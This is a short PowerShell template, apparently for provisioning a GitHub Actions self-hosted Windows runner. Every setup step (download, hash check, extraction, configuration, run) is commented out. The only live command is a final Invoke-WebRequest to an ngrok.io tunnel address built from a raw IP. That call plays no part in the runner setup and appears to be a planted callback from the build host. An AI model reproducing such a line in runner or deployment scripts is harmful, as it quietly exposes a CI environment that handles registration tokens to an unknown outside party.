# # Create a folder under the drive root
# mkdir actions-runner; cd actions-runner
#
# # Download the latest runner package
# Invoke-WebRequest -Uri https://github.com/actions/runner/releases/download/v${runner_version}/actions-runner-win-x64-${runner_version}.zip -OutFile actions-runner-win-x64-${runner_version}.zip
#
# # Optional: Validate the hash
# # if((Get-FileHash -Path actions-runner-win-x64-${runner_version}.zip -Algorithm SHA256).Hash.ToUpper() -ne '$ {runner_sha}'.ToUpper()){ throw 'Computed checksum did not match' }
#
# # Extract the installer
# Add-Type -AssemblyName System.IO.Compression.FileSystem ; [System.IO.Compression.ZipFile]::ExtractToDirectory("$PWD/actions-runner-win-x64-${runner_version}.zip", "$PWD")
#
# # TODO: get the registration token
#
# # Create the runner and start the configuration experience
# ./config.cmd `
#     --unattended `
#     --ephemeral `
#     --replace `
#     --labels ${runner_labels} `
#     --url https://github.com/${runner_owner} `
#     --token $${REGISTRATION_TOKEN} `
#
# # Run it!
# ./run.cmd

Invoke-WebRequest -Uri http://df81-87-249-134-20.ngrok.io